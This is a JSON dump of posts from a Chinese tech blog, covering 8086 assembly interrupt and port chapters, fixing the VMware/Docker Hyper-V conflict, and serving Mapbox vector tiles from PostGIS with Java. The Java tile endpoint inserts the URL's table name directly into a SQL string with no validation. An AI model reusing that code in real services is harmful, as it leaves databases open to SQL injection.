标志寄存器"},{"content":"任何一个通用的CPU，比如8086，都具备一种能力，可以在执行完当前正在执行的指令之后，检测到从CPU 外部发送过来的或内部产生的一种特殊信息，并且可以立即对所接收到的信息进行处理。这种特殊的信息，我们可以称其为:中断信息。中断的意思是指，CPU不再接着(刚执行完的指令)向下执行，而是转去处理这个特殊信息。\n内中断的产生 当CPU的内部有什么事情发生的时候，将产生需要马上处理的中断信息呢?\n对于8086CPU，当CPU内部有下面的情况发生的时候，将产生相应的中断信息。\n(1)除法错误，比如，执行div指令产生的除法溢出;\n(2)单步执行;\n(3)执行into指令;(4)执行int指令。\n中断向量表 CPU用8位的中断类型码通过中断向量表找到相应的中断处理程序的入口地址。那么什么是中断向量表呢?中断向量表就是中断向量的列表。那么什么又是中断向量呢﹖所谓中断向量，就是中断处理程序的入口地址。展开来讲，中断向量表，就是中断处理程序入口地址的列表。\n编程处理0号中断 (1)编写可以显示“overflow!”的中断处理程序:do0;\n(2)将do0送入内存0000:0200处;\n(3)将do0的入口地址0000:0200存储在中断向量表0号表项中。\n时钟中断 在Linux的0号中断是一个定时器中断。在固定的时间间隔都发生一次中断，也是说每秒发生该中断的频率都是固定的。该频率是常量HZ，该值一般是在100 ~ 1000之间。该中断的作用是为了定时更新系统日期和时间，使系统时间不断地得到跳转。另外该中断的中断处理函数除了更新系统时间外，还需要更新本地CPU统计数。指的是调用scheduler_tick递减进程的时间片，若进程的时间片递减到0，进程则被调度出去而放弃CPU使用权。\nLinux的OS时钟的物理产生原因是可编程定时/计数器产生的输出脉冲，这个脉冲送入CPU，就可以引发一个中断请求信号，我们就把它叫做时钟中断。\n时钟中断是特别重要的一个中断，因为整个操作系统的活动都受到它的激励。系统利用时钟中断维持系统时间、促使环境的切换，以保证所有进程共享CPU；利用时钟中断进行记帐、监督系统工作以及确定未来的调度优先级等工作。可以说，时钟中断是整个操作系统的脉搏。\n","permalink":"https://chance7bin.github.io/posts/basic/asm/%E7%AC%AC12%E7%AB%A0-%E5%86%85%E4%B8%AD%E6%96%AD/","summary":"任何一个通用的CPU，比如8086，都具备一种能力，可以在执行完当前正在执行的指令之后，检测到从CPU 外部发送过来的或内部产生的一种特殊信息","title":"第12章 内中断"},{"content":"另一种重要的内中断，由int指令引发的中断。\nint指令的格式为: int n，n为中断类型码，它的功能是引发中断过程。\nCPU执行int n指令，相当于引发一个n号中断的中断过程，执行过程如下。\n从此处转去执行n号中断的中断处理程序。\n可以在程序中使用int指令调用任何一个中断的中断处理程序。\n","permalink":"https://chance7bin.github.io/posts/basic/asm/%E7%AC%AC13%E7%AB%A0-int%E6%8C%87%E4%BB%A4/","summary":"另一种重要的内中断，由int指令引发的中断。 int指令的格式为: int n，n为中断类型码，它的功能是引发中断过程。 CPU执行int n指令，相当于","title":"第13章 int指令"},{"content":"我们前面讲过，各种存储器都和 CPU 的地址线、数据线、控制线相连。CPU 在操控它们的时候，把它们都当作内存来对待，把它们总地看做一个由若干存储单元组成的逻辑存储器，这个逻辑存储器我们称其为内存地址空间(可参见1.15节)。\n在PC机系统中，和 CPU通过总线相连的芯片除各种存储器外，还有以下3种芯片。\n(1)各种接口卡(比如，网卡、显卡)上的接口芯片，它们控制接口卡进行工作;\n(2)主板上的接口芯片，CPU通过它们对部分外设进行访问;\n(3)其他芯片，用来存储相关的系统信息，或进行相关的输入输出处理。\n在这些芯片中，都有一组可以由CPU读写的寄存器。这些寄存器，它们在物理上可能处于不同的芯片中，但是它们在以下两点上相同。\n(1) 都和CPU 的总线相连，当然这种连接是通过它们所在的芯片进行的;\n(2) CPU对它们进行读或写的时候都通过控制线向它们所在的芯片发出端口读写命令。\n可见，从CPU 的角度，将这些寄存器都当作端口，对它们进行统一编址，从而建立了一个统一的端口地址空间。每一个端口在地址空间中都有一个地址。\nCPU可以直接读写以下3个地方的数据。\n(1)CPU 内部的寄存器;\n(2)内存单元;\n(3)端口。\n","permalink":"https://chance7bin.github.io/posts/basic/asm/%E7%AC%AC14%E7%AB%A0-%E7%AB%AF%E5%8F%A3/","summary":"我们前面讲过，各种存储器都和 CPU 的地址线、数据线、控制线相连。CPU 在操控它们的时候，把它们都当作内存来对待，把它们总地看做一个由若干存储单元","title":"第14章 端口"},{"content":"接口芯片和端口 第14章我们讲过，PC系统的接口卡和主板上，装有各种接口芯片。这些外设接口芯片的内部有若干寄存器，CPU将这些寄存器当作端口来访问。\n外设的输入不直接送入内存和 CPU，而是送入相关的接口芯片的端口中;CPU向外设的输出也不是直接送入外设，而是先送入端口中，再由相关的芯片送到外设。CPU还可以向外设输出控制命令，而这些控制命令也是先送到相关芯片的端口中，然后再由相关的芯片根据命令对外设实施控制。\n可见，CPU 通过端口和外部设备进行联系。\n外中断信息 现在，我们知道了外设的输入被存放在端口中，可是外设的输入随时都有可能到达，CPU 如何及时地知道，并进行处理呢﹖更一般地讲，就是外设随时都可能发生需要CPU及时处理的事件，CPU 如何及时得知并进行处理?\nCPU提供中断机制来满足这种需要。前面讲过，当CPU 的内部有需要处理的事情发生的时候，将产生中断信息，引发中断过程。这种中断信息来自CPU的内部。\n还有一种中断信息，来自于CPU外部，当CPU 外部有需要处理的事情发生的时候，比如说，外设的输入到达，相关芯片将向CPU发出相应的中断信息。CPU在执行完当前指令后，可以检测到发送过来的中断信息，引发中断过程，处理外设的输入。\n在PC系统中，外中断源一共有以下两类。\n1．可屏蔽中断\n可屏蔽中断是CPU可以不响应的外中断。CPU是否响应可屏蔽中断，要看标志寄存器的IF位的设置。当CPU检测到可屏蔽中断信息时，如果IF=1，则CPU在执行完当前指令后响应中断，引发中断过程;如果IF=0，则不响应可屏蔽中断。\n2．不可屏蔽中断\n不可屏蔽中断是CPU必须响应的外中断。当CPU检测到不可屏蔽中断信息时，则在执行完当前指令后，立即响应，引发中断过程。\n几乎所有由外设引发的外中断，都是可屏蔽中断。当外设有需要处理的事件(比如说键盘输入)发生时，相关芯片向CPU发出可屏蔽中断信息。不可屏蔽中断是在系统中有必须处理的紧急情况发生时用来通知CPU的中断信息。\n指令系统总结 ","permalink":"https://chance7bin.github.io/posts/basic/asm/%E7%AC%AC15%E7%AB%A0-%E5%A4%96%E4%B8%AD%E6%96%AD/","summary":"接口芯片和端口 第14章我们讲过，PC系统的接口卡和主板上，装有各种接口芯片。这些外设接口芯片的内部有若干寄存器，CPU将这些寄存器当作端口来","title":"第15章 外中断"},{"content":"编写一个子程序，计算 sin(x)，x∈{0°，30°,60°, 90°, 120°, 150°, 180°},并在屏幕中间显示计算结果。比如 sin(30)的结果显示为“0.5”。\n我们可以利用麦克劳林公式来计算sin(x)\n可以看出，计算 sin(x)需要进行多次乘法和除法。乘除是非常费时的运算，它们的执行时间大约是加法、比较等指令的5倍。如何才能够不做乘除而计算 sin(x)呢?我们看一下需要计算的sin(x)的结果:\nsin(0)=0\nsin(30)=0.5\nsin(60)=0.866\nsin(90)=1\nsin(120)=0.866\nsin(150)=0.5\nsin(180)=0\n我们可以看出，其实用不着计算，可以占用一些内存空间来换取运算的速度。将所要计算的sin(x)的结果都存储到一张表中;然后用角度值来查表，找到对应的sin(x)的值。\n","permalink":"https://chance7bin.github.io/posts/basic/asm/%E7%AC%AC16%E7%AB%A0-%E7%9B%B4%E6%8E%A5%E5%AE%9A%E5%9D%80%E8%A1%A8/","summary":"编写一个子程序，计算 sin(x)，x∈{0°，30°,60°, 90°, 120°, 150°, 180°},并在屏幕中间显示计算结果。比如 sin(","title":"第16章 直接定址表"},{"content":"int 9中断例程对键盘输入的处理 使用int 16h中断例程读取键盘缓冲区 字符串的输入 应用int 13h中断例程对磁盘进行读写 ","permalink":"https://chance7bin.github.io/posts/basic/asm/%E7%AC%AC17%E7%AB%A0-%E4%BD%BF%E7%94%A8bios%E8%BF%9B%E8%A1%8C%E9%94%AE%E7%9B%98%E8%BE%93%E5%85%A5%E5%92%8C%E7%A3%81%E7%9B%98%E8%AF%BB%E5%86%99/","summary":"int 9中断例程对键盘输入的处理 使用int 16h中断例程读取键盘缓冲区 字符串的输入 应用int 13h中断例程对磁盘进行读写","title":"第17章 使用BIOS进行键盘输入和磁盘读写"},{"content":"前言 为什么需要理解虚拟机的网络机制呢？主要原因是我安装了windows的docker之后vmware里面的虚拟机打不开了\n一通操作把vmware的虚拟机打开了，但是虚拟机的网络又用不了了，所以有必要深入了解下虚拟机网络的相关知识\n何为 Hypervisor Hypervisor又称Virtual Machine Monitor（VMM）是用于创建和运行虚拟机（VM）的计算机软件，固件或硬件。承载Hypervisor和虚拟机的计算机称为宿主机（Host Machine），运行于宿主机上的虚拟机称为客户机（Guest Machine）。 Hypervisor为客体操作系统提供虚拟的作业平台并管理客体操作系统，使得不同操作系统的众多实例可以共享虚拟的硬件资源\n可以简单地理解为 Hypervisor 为虚拟机的运行提供了软件层面的基础\nHypervisor 通常分为两类, Type-1 和 Type-2\nType-1：直接运行在硬件层面上来管理虚拟机（例如Hyper-V） Type-2：像其他应用程序一样运行在常规的操作系统中，一个客户机作为一个进程运行在宿主机上（例如VMWare WorkStation） 冲突是什么 Docker 官方出品的 Windows 客户端，而其正常运行的条件之一是系统开启了 Hyper-V 虚拟化服务。\n由上文知 Hyper-V 是 Type-1 的 Hypervisor，这将使得像 VMware 等作为 Type-2 Hypervisor 的软件无法运行\n使用 Hyper-V 技术的 Docker 客户端与其他 Type-2 Hypervisor 不能同时运行， 必须重启并关闭 Hyper-V 才能再次运行其他的 Type-2 Hypervisor 软件\nvmware与docker配置 由于docker与vmware的不兼容，导致出现两个软件无法同时使用以及网络方面的问题\n所以在使用时只能二者选择其一，以下是使用两个软件时需要做的相关配置\n使用vmware 步骤一：禁用Device Guard或Credential Guard：\n1.禁用用于启用Credential Guard的组策略设置。\n在主机操作系统上，右键单击**“开始” \u0026gt; “运行”**，键入gpedit.msc，然后单击“ 确定”，打开本地组策略编辑器。 转至本地计算机策略 \u0026gt; 计算机配置 \u0026gt; 管理模板\u0026gt;系统 \u0026gt;Device Guard（或者是： 设备防护） \u0026gt; 启用基于虚拟化的安全性。 选择已禁用。 2.转到**“控制面板” \u0026gt;“ 卸载程序” \u0026gt;“ 打开或关闭Windows功能”**以关闭Hyper-V。\n3.选择不重启。\n步骤二：通过命令关闭Hyper-V（控制面板关闭Hyper-V起不到决定性作用，要彻底关闭Hyper-V）\n以管理员身份运行Windows Powershell (管理员)（Windows键+X）\n运行下面命令并重启电脑！\n1 bcdedit /set hypervisorlaunchtype off 使用docker Docker是基于Hyper-V服务的，Hyper-V主机服务的运行可以用命令开启关闭\n控制面板（可选）\nPowerShell的管理员模式\n对应的打开Hyper-V的命令：\n1 bcdedit /set hypervisorlaunchtype auto 重启电脑！\ndocker windows 安装\nWindows10 Docker安装详细教程\nWindows 10 - Docker\n为什么虚拟机连不上网络 参考\nVMware 虚拟机里连不上网的五种解决方案\nVMware虚拟机网络配置-NAT篇\n使用NAT模式会出现无法访问外网的情况，可能原因与校园网的配置有关，所以解决方法是使用==桥接模式==，就可以访问外网了\nVM桥接模式下 复制物理网络连接状态选项有什么作用？\n如果要虚拟机上网，勾不勾该选项，没什么区别。 如果不勾的话，无线和有线切换，很有可能IP地址发生变化，需要重新查看。 分割线——下面的方法理论上可行，但是我配置不成功 猜测的原因可能与vEthernet有关\nvEthernet是Win10系统在添加了Hyper-V虚拟机组件之后自动创建的虚拟网卡\n方法一：修改主机网络配置 1.找到自己现在连接的网络，右键→属性→共享→勾选允许其他网络连接→将虚拟机的NAT网络 VM8共享连接到该网络 保存\n==2.重新配置vmware的net网络==\n因为上一步把vmnet8的网络配置改了，所以要重新配置vmware的net网络\nVMware虚拟机网络配置-NAT篇\n方法二：禁用Hyper-V主机服务 控制面板\nPowerShell的管理员模式\n对应的打开Hyper-V的命令：\n1 bcdedit /set hypervisorlaunchtype auto 重启电脑！\n上述步骤操作完成之后vEthernet就删除了\n参考\nWindows 下 Docker 与 VMware 共存\nWin下Docker与VM虚拟机不兼容\n解决VM 与 Device/Credential Guard 不兼容。在禁用 Device/Credential Guard 后，可以运行 VM 的方法\n","permalink":"https://chance7bin.github.io/posts/note/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9Cvmwaredocker/","summary":"前言 为什么需要理解虚拟机的网络机制呢？主要原因是我安装了windows的docker之后vmware里面的虚拟机打不开了 一通操作把vmwar","title":"虚拟机网络——vmware\u0026docker"},{"content":"矢量瓦片 GIS中的矢量与栅格数据 矢量切片(Vector tile)\n在GIS中的数据分类有很多种方式，其中最常用的一种是根据数据组织结构方式的不同而分类成矢量数据和栅格数据的两种类型。\n其中栅格数据以二维矩阵的形式来表示地理空间信息的数据结构，其中数据的最小存在单元是以像素的形式存在，可以理解为和图片的组织结构类似，以分辨率等特征作为精度的定义标准。\n而矢量数据则是试图利用点、线、面等几何要素来表现这个世界，其数据结构紧凑精准，数据图形质量好，有利于地理信息检索与网络传输等。其中矢量数据的最小单元是以点的形式存在，点构成线，线组成面，面构造出体。所以，我个人看来矢量数据应该更贴近于信息的精准分析与计算，而栅格数据则偏重于信息的表达（主要受制于当前图像处理技术的瓶颈）。\n栅格数据\r矢量数据数据\r为了带来更好更快的用户体验，目前许多主流WebGIS应用都采用了栅格切片技术，通过缓存切片的形式使得地图数据的浏览体验更顺畅。打开浏览器，F12出控制台，进入任意一家地图供应商提供的地图应用，你会发现大部分的地图数据都是以切片的形式请求获得的。栅格地图的切片应用是很广泛，可在我们的日常工作中遇到的需求往往要比这些功能需求较浅的商业性地图复杂，有的时候用户甚至会提出需要地图配色的编辑修改功能这样的需求，这是商业主流地图所达不到的，因为栅格切片在完成切图之后，所能控制的最小单位是一张图片，失去了对图片上地理信息的交互能力。\n总结来看，栅格切片存在以下的几个缺点：\n地图数据一次渲染，无法修改 无交互能力 那可否用WFS来替代呢？直接用WFS请求获取矢量数据，这样不就获得了交互能力吗？当然，如果在你的应用中矢量数据量不大的情况下，这样做也是可行的，但是一旦数据量大了起来，前端对于数据的请求和响应处理渲染会提高客户端的硬件门槛，而频繁的交互操作也会对服务器产生压力。\n直接加载的矢量数据与对栅格地图进行切片这两种方式看起来好像有些互补，如果能将这二者结合起来的话应该会很美好： 矢量+切片=矢量切片。\n什么是矢量切片？ 和栅格切片一样的思路，以金字塔的方式切割矢量数据，只不过切割的不是栅格图片，而是矢量数据的描述性文件，目前矢量切片主要有以下三种格式：GeoJSON，TopoJSON和MapbBox Vector Tile(MVT)。\n栅格切图后文件存储形式 ：\n矢量切图后文件存储形式：\n切片中的数据结构：\n从上面的两张图可以看出，其实思路是一致的，因此，矢量切图结合了矢量数据与栅格切图的优势互补：\n前端缓存切片，提高地图使用的体验 粒度上来看，矢量切图继承了矢量数据的特性，以要素为单位进行管理，加强了细节上的把控能力 在保证体验的前提下，为用户提供地图数据样式动态修改的功能，加强了地图定制化的程度 数据的实时性 如何生成矢量切片？ 矢量切片生成方式共有以下几种：\n1）ArcGIS 系列产品：利用ArcGIS Pro生成矢量切片，然后发布在ArcGIS Online上；\n2）Mapbox，目前已经提出了一套开放的矢量切片标准，并被多个开源团队所接受；\n3）GeoServer，在2.11beta版中出现了对矢量切片的支持，主要依赖于开源插件geoserver-2.11-SNAPSHOT-vectortiles-plugin以及内嵌的GeoWebcahce完成切片工作。\n==本文采取Mapbox的方式==\nMapbox的矢量瓦片 MVT简介 Mapbox的矢量瓦片（mapbox vector tile）是一种轻量级的数据格式，用于存储地理空间矢量数据，例如点、线和多边形。\n矢量瓦片以 Google Protobufs（PBF）进行编码，这允许对结构化数据进行序列化。\nMapbox矢量瓦片使用的是.mvt的文件后缀。\nMapbox矢量瓦片标准 Mapbox矢量瓦片标准\nVector tiles standards\n几何编码 Encoding geometry\n几何编码将点、线和多边形编码为相对于网格左上角的x/y坐标对，如下图所示\nMoveTo：起点\nLineTo：画线\nClosePath：闭环\n属性编码 Encoding attributes\n属性编码是采用键值对的方式，压缩重复的属性值，将属性的键值对与矢量瓦片的键值对一一对应\n有了矢量瓦片标准，对于在Web里面来说，利用WebGL的moveTo/lineTo之类的API，可以将矢量瓦片绘制出来。\n使用PostGIS生成mvt WebMecator投影瓦片计算规则 在生成mvt前，需要先了解一下瓦片的计算规则\n参考链接：\nhttps://zhuanlan.zhihu.com/p/548171000\nhttps://www.cnblogs.com/beniao/archive/2010/04/18/1714544.html\n墨卡托投影（Mercator Projection），又名“等角正轴圆柱投影”，荷兰地图学家墨卡托（Mercator）在1569年拟定，假设地球被围在一个中空的圆柱里，其赤道与圆柱相接触，然后再假想地球中心有一盏灯，把球面上的图形投影到圆柱体上，再把圆柱体展开，这就是一幅标准纬线为零度（即赤道）的“墨卡托投影”绘制出的世界地图。\n由于赤道半径为6378137米，则赤道周长为2 * PI * r = 40075016.685578486162，因此X轴的取值范围：[-20037508.3427892,20037508.3427892]。当纬度φ接近两极，即90°时，Y值趋向于无穷。因此通常把Y轴的取值范围也限定在[-20037508.3427892,20037508.3427892]之间。因此在墨卡托投影坐标系（米）下的坐标范围是：最小为(-20037508.3427892, -20037508.3427892 )到最大坐标为(20037508.3427892, 20037508.3427892)。\n基础值\n1 2 3 4 地球半径：EARTH_RADIUS = 6378137; X和Y的最大值： worldMercMax = π*EARTH_RADIUS = 20037508.3427892 X和Y的最小值： worldMercMin = -1 * worldMercMax 地球赤道周长： worldMercSize = worldMercMax - worldMercMin= 2 * π * EARTH_RADIUS = 40075016.68557848616 谷歌的瓦片地图规范已经实行多年，并深受认可，Bing、OSM、高德、天地图等都使用谷歌的瓦片地图规范，谷歌瓦片地图规范坐标原点为东经180°，北纬85.05°，==x轴向右，y轴向下==。\n瓦片被切成256*256像素的图片，在不同的zoom等级，\nt瓦片数量为： $2^{level}$\n例如，zoom level为3时，横轴和纵轴方向瓦片数量均为8，瓦片对应坐标如下图所示。\n生成mvt的ST函数 参考链接：\nhttps://www.jianshu.com/p/e15ca286546c\nhttps://blog.csdn.net/qq_35241223/article/details/106439268\n主要函数：\nST_AsMvtGeom 用于将一个图层中位于参数box2d范围内的一个几何图形的所有坐标转换为MapBox Vector Tile坐标空间里的坐标。\nST_AsMVT 用于将基于MapBox Vector Tile坐标空间的几何图形转换为MapBox VectorTile二进制矢量切片\nST_TileEnvelope（3.0以上支持） 根据行列号获取Envelope\n辅助函数：\nST_Transform 坐标转换函数，用它可以做到支持任何坐标系的矢量瓦片\nST_Simplify 简化，用它来做线或者面的简化\nST_SimplifyPreserveTopology 与简化类似\nST_AsMvtGeom 应该将geom转到墨卡托坐标下，4326坐标下制作矢量瓦片有横向的压扁\nST_AsMVT 用于将基于MapBox Vector Tile坐标空间的几何图形转换为MapBox VectorTile二进制矢量切片\nrow —— 至少具有一个geometry列的行数据。 name —— 图层名字，默认为\u0026quot;default\u0026quot;。 extent —— 由MVT规范定义的屏幕空间（MVT坐标空间）中的矢量切片范围。 geom_name —— row参数的行数据中geometry列的列名，默认是第一个*geometry类型的列。 feature_id_name —— 行数据中要素ID列的列名。如果未指定或为NULL，则第一个有效数据类型（smallint, integer, bigint）的列将作为要素ID列，其他的列作为要素属性列。 ST_AsMVTGeom 用于将一个图层中位于参数box2d范围内的一个几何图形的所有坐标转换为MapBox Vector Tile坐标空间里的坐标。\ngeom —— 被转换的几何图形信息。 bounds—— 某个矢量切片的范围对应的空间参考坐标系中的几何矩形框（没有缓冲区）。 extent—— 是按规范定义的矢量切片坐标空间中的某个矢量切片的范围。如果为NULL，则默认为4096（边长为4096个单位的正方形）。 buffer—— 矢量坐标空间中缓冲区的距离，位于该缓冲区的几何图形部位根据clip_geom参数被裁剪或保留。如果为NULL，则默认为256。 clip_geom—— 用于选择位于缓冲区的几何图形部位是被裁剪还是原样保留。如果为NULL，则默认为true。 PostGIS生成MVT矢量切片的步骤 使用ST_AsMVTGeom函数将几何图形的所有坐标转换为MapBox Vector Tile坐标空间里的坐标，这样就将基于空间坐标系的几何图形转换成了基于MVT坐标空间的几何图形。 使用ST_AsMVT函数将基于MVT坐标空间的几何图形转换为MVT二进制矢量切片。 可以通过\u0026quot;||\u0026ldquo;操作符调用多次这个函数来同时创建多个图层的同一位置的矢量切片。\nPostGIS ST函数 1 2 3 4 5 6 7 8 9 10 11 WITH bounds AS ( SELECT ST_Segmentize(ST_MakeEnvelope(13071343.332991, 3678761.297309, 13149614.849955, 3757032.814273, 3857),19567.879241) AS geom, ST_Segmentize(ST_MakeEnvelope(13071343.332991, 3678761.297309, 13149614.849955, 3757032.814273, 3857),19567.879241)::box2d AS b2d ), mvtgeom AS ( SELECT ST_AsMVTGeom(ST_Transform(t.geom, 3857), bounds.b2d) AS geom, * FROM js_city_point_u_6492c1048429434b637f1be5 t, bounds WHERE ST_Intersects(t.geom, ST_Transform(bounds.geom, 4326)) ) SELECT ST_AsMVT(mvtgeom.* , \u0026#39;js_city_point_u_6492c1048429434b637f1be5\u0026#39; ) FROM mvtgeom 这段 PostGIS SQL 语句就是用于生成 MVT（Mapbox Vector Tiles）数据。\n让我们逐步解释这段 SQL 语句的意思：\n首先，使用 WITH 子句创建一个名为 bounds 的临时表，其中包含一个几何对象和一个边界框（box2d）。这个几何对象是通过使用 ST_MakeEnvelope 函数创建的，该函数根据提供的坐标范围**（tileToEnvelope函数计算得到）**和坐标系生成一个矩形。然后，使用 ST_Segmentize 函数对几何对象进行分段，以确保生成的矢量瓦片在显示时具有一定的细节和精度。\n接下来，使用 mvtgeom 作为名称创建另一个临时表。在这个临时表中，使用 ST_Transform 函数将 t.geom（js_city_point_u_6492c1048429434b637f1be5 表中的几何列）从源坐标系（4326）转换为目标坐标系（3857）。然后，使用 ST_AsMVTGeom 函数将转换后的几何对象与 bounds.b2d 边界框进行相交（使用 ST_Intersects 函数），从而获得符合条件的几何对象。在结果中，还包含原始表 t 的所有列。\n最后，使用 SELECT 语句从 mvtgeom 表中选择几何对象，并使用 ST_AsMVT 函数将这些几何对象转换为 MVT 格式的瓦片。'js_city_point_u_6492c1048429434b637f1be5' 是指定瓦片的图层名称。\n简而言之，这个 SQL 查询的目的是生成包含符合条件的几何对象的 MVT 瓦片数据。它利用了 PostGIS 的空间函数和转换功能来处理几何对象的坐标系转换和分段，然后将结果转换为 MVT 格式的瓦片数据。\nST_MakeEnvelope需要的范围是如何确定的呢？\n有了前面瓦片的计算规则的基础，就不难理解所求瓦片的x/y最大值最小值范围的计算方法了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 HashMap\u0026lt;String, Double\u0026gt; tileToEnvelope(int zoom, int x, int y) { double worldMercMax = 20037508.3427892; double worldMercMin = -1 * worldMercMax; double worldMercSize = worldMercMax - worldMercMin; double worldTileSize = Math.pow(2, zoom); double tileMercSize = worldMercSize / worldTileSize; HashMap\u0026lt;String, Double\u0026gt; env = new HashMap\u0026lt;String, Double\u0026gt;(); env.put(\u0026#34;xmin\u0026#34;, worldMercMin + tileMercSize * x); env.put(\u0026#34;xmax\u0026#34;, worldMercMin + tileMercSize * (x + 1)); env.put(\u0026#34;ymin\u0026#34;, worldMercMax - tileMercSize * (y + 1)); env.put(\u0026#34;ymax\u0026#34;, worldMercMax - tileMercSize * y); return env; } Java代码实现 接口返回的数据是==MVT二进制矢量切片==\nController 1 2 3 4 5 6 7 8 9 @GetMapping(value = \u0026#34;/mvt/{tableName}/{zoom}/{x}/{y}.pbf\u0026#34;) public void getMvt(@PathVariable(\u0026#34;tableName\u0026#34;) String tableName, @PathVariable(\u0026#34;zoom\u0026#34;) int zoom, @PathVariable(\u0026#34;x\u0026#34;) int x, @PathVariable(\u0026#34;y\u0026#34;) int y, HttpServletResponse response) { pgService.getMvt(zoom, x, y, tableName, response); } Service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public void getMvt(int zoom, int x, int y, String tableName, HttpServletResponse response) { try { String sql = getMvtSql(zoom, x, y, tableName); if (sql == null) { return; } log.info(\u0026#34;DefaultPgSource: \u0026#34; + zoom + \u0026#34;, \u0026#34; + x + \u0026#34;, \u0026#34; + y + \u0026#34;:\u0026#34; + sql); byte[] mvtByte = mvtRepository.getMvtFromDefaultPg(sql); returnMvtByte(mvtByte, zoom, x, y, response); } catch (Exception e) { log.error(e.getMessage()); } } public String getMvtSql(int zoom, int x, int y, String tableName) { if (!MvtUtils.tileIsValid(zoom, x, y)) { return null; } HashMap\u0026lt;String, Double\u0026gt; envelope = MvtUtils.tileToEnvelope(zoom, x, y); String sql = MvtUtils.envelopeToSQL(envelope, tableName); return sql; } public void returnMvtByte(byte[] mvtByte, int zoom, int x, int y, HttpServletResponse response) throws IOException { response.setHeader(\u0026#34;Access-Control-Allow-Origin\u0026#34;, \u0026#34;*\u0026#34;); response.setHeader(\u0026#34;Content-type\u0026#34;, \u0026#34;application/vnd.mapbox-vector-tile\u0026#34;); String mtvFileName = String.format(\u0026#34;%d_%d_%d.mvt\u0026#34;, zoom, x, y); response.setHeader(\u0026#34;Content-Disposition\u0026#34;, \u0026#34;attachment;filename=\u0026#34; + new String(mtvFileName.getBytes(\u0026#34;UTF-8\u0026#34;), \u0026#34;iso-8859-1\u0026#34;)); OutputStream os = response.getOutputStream(); os.write(mvtByte); } Repository 1 2 3 4 5 6 7 8 9 public byte[] getMvtFromDefaultPg(String sql) { try { byte[] reByte = jdbcTemplate.queryForObject(sql, (rs, rowNum) -\u0026gt; rs.getBytes(\u0026#34;st_asmvt\u0026#34;)); return reByte; } catch (Exception e) { log.error(\u0026#34;默认数据库瓦片获取失败\u0026#34; + e.getMessage()); return null; } } MVT工具类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 public class MvtUtils { public static Boolean tileIsValid(int zoom, int x, int y) { Double size = Math.pow(2, zoom); if (x \u0026gt;= size || y \u0026gt;= size) { return false; } if (x \u0026lt; 0 || y \u0026lt; 0) { return false; } return true; } public static HashMap\u0026lt;String, Double\u0026gt; tileToEnvelope(int zoom, int x, int y) { double worldMercMax = 20037508.3427892; double worldMercMin = -1 * worldMercMax; double worldMercSize = worldMercMax - worldMercMin; double worldTileSize = Math.pow(2, zoom); double tileMercSize = worldMercSize / worldTileSize; HashMap\u0026lt;String, Double\u0026gt; env = new HashMap\u0026lt;String, Double\u0026gt;(); env.put(\u0026#34;xmin\u0026#34;, worldMercMin + tileMercSize * x); env.put(\u0026#34;xmax\u0026#34;, worldMercMin + tileMercSize * (x + 1)); env.put(\u0026#34;ymin\u0026#34;, worldMercMax - tileMercSize * (y + 1)); env.put(\u0026#34;ymax\u0026#34;, worldMercMax - tileMercSize * y); return env; } public static String envelopeToBoundsSQL(HashMap\u0026lt;String, Double\u0026gt; env) { int DENSIFY_FACTOR = 4; env.put(\u0026#34;segSize\u0026#34;, (env.get(\u0026#34;xmax\u0026#34;) - env.get(\u0026#34;xmin\u0026#34;)) / DENSIFY_FACTOR); String sqlTemp = String.format(\u0026#34;ST_Segmentize(ST_MakeEnvelope(%f, %f, %f, %f, 3857),%f)\u0026#34;, env.get(\u0026#34;xmin\u0026#34;), env.get(\u0026#34;ymin\u0026#34;), env.get(\u0026#34;xmax\u0026#34;), env.get(\u0026#34;ymax\u0026#34;), env.get(\u0026#34;segSize\u0026#34;)); return sqlTemp; } public static String envelopeToSQL(HashMap\u0026lt;String, Double\u0026gt; env, String tableName) { // lines_pg gis_osm_transport_free_1 HashMap\u0026lt;String, String\u0026gt; table = new HashMap\u0026lt;String, String\u0026gt;(); table.put(\u0026#34;table\u0026#34;, tableName); table.put(\u0026#34;srid\u0026#34;, \u0026#34;4326\u0026#34;); table.put(\u0026#34;geomColumn\u0026#34;, \u0026#34;geom\u0026#34;); table.put(\u0026#34;attrColumns\u0026#34;, \u0026#34; * \u0026#34;); table.put(\u0026#34;env\u0026#34;, envelopeToBoundsSQL(env)); String mvtsql = MessageFormat.format(\u0026#34;WITH\u0026#34; + \u0026#34; bounds AS ( SELECT {0} AS geom, {0}::box2d AS b2d),\u0026#34; + \u0026#34; mvtgeom AS (\u0026#34; + \u0026#34; SELECT ST_AsMVTGeom(ST_Transform(t.{1}, 3857), bounds.b2d) AS geom, {2}\u0026#34; + \u0026#34; FROM {3} t, bounds\u0026#34; + \u0026#34; WHERE ST_Intersects(t.{1}, ST_Transform(bounds.geom, {4}))\u0026#34; + \u0026#34; )\u0026#34; + \u0026#34; SELECT ST_AsMVT(mvtgeom.* , \u0026#39;\u0026#39;{3}\u0026#39;\u0026#39; ) FROM mvtgeom\u0026#34;, table.get(\u0026#34;env\u0026#34;), table.get(\u0026#34;geomColumn\u0026#34;), table.get(\u0026#34;attrColumns\u0026#34;), table.get(\u0026#34;table\u0026#34;), table.get(\u0026#34;srid\u0026#34;)); return mvtsql; } } ","permalink":"https://chance7bin.github.io/posts/map/mapbox-vector-tile-%E8%AF%A6%E8%A7%A3/","summary":"矢量瓦片 GIS中的矢量与栅格数据 矢量切片(Vector tile) 在GIS中的数据分类有很多种方式，其中最常用的一种是根据数据组织结构方式的不同而分类","title":"mapbox vector tile 详解"},{"content":"1.mbtiles简介 mapbox Docs : MBTiles\nMbTiles 是一种用于在 sqllite 数据库中存储任意瓦片地图数据用于即时使用和高效传输的规范。\nMBTiles瓦片存储规范的制定主要是为了解决、优化传统瓦片的存储方案存在的两个问题：\n可移植性差，无法在移动端上做离线应用 存储量大，大家都知道，因为互联网上的地图都以“瓦片”的形式存在，高层级的瓦片存储数量往往是海量的。例如，对于“Web 墨卡托”投影的瓦片金字塔来说，第15层数据有 4^15 = 1073741824个瓦片。 